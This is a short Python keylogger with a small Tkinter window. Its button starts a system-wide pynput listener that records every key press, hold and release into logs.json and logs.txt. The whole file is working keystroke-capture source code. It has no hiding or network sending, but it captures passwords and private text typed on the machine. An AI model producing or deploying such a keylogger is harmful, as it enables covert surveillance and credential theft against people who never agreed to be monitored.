import tkinter as tk
from tkinter import Label, Button
from pynput import keyboard
import json



root = tk.Tk()
root.geometry("250x300")
root.title("Keylogger Page")
root.configure(bg="lightgreen")



key_list = []        
x = False           
key_strokes = ""    

def update_txt_file(key):
    """Store the continuous keystroke stream in logs.txt."""
    with open("logs.txt", "w+", encoding="utf-8") as key_stroke:
        key_stroke.write(key)


def update_json_file(key_list_local):
    """Store structured key events in logs.json."""
    with open("logs.json", "wb") as key_log:
        key_list_bytes = json.dumps(
            key_list_local,
            ensure_ascii=False,
            indent=2
        ).encode()
        key_log.write(key_list_bytes)


def on_press(key):
    global x, key_list

    if x is False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    elif x is True:
        key_list.append({'Held': f'{key}'})

    update_json_file(key_list)


def on_release(key):
    global x, key_list, key_strokes

    key_list.append({'Released': f'{key}'})
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

    if x is True:
        x = False



empty = Label(root, text="", bg="lightgreen").grid(row=0, column=0)
empty = Label(root, text="", bg="lightgreen").grid(row=1, column=0)
empty = Label(root, text="", bg="lightgreen").grid(row=2, column=0)
empty = Label(root,
              text="Keylogger Project",
              font='Verdana 11 bold',
              bg="lightgreen").grid(row=3, column=3)
empty = Label(root, text="", bg="lightgreen").grid(row=4, column=0)
empty = Label(root, text="", bg="lightgreen").grid(row=5, column=0)


def butaction():
    print("[+] Running Keylogger successfully!")
    print("[!] Saving the key logs in 'logs.json' and 'logs.txt'")

    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()


Button(root,
       text="Start Keylogger",
       command=butaction).grid(row=6, column=3)

root.mainloop()
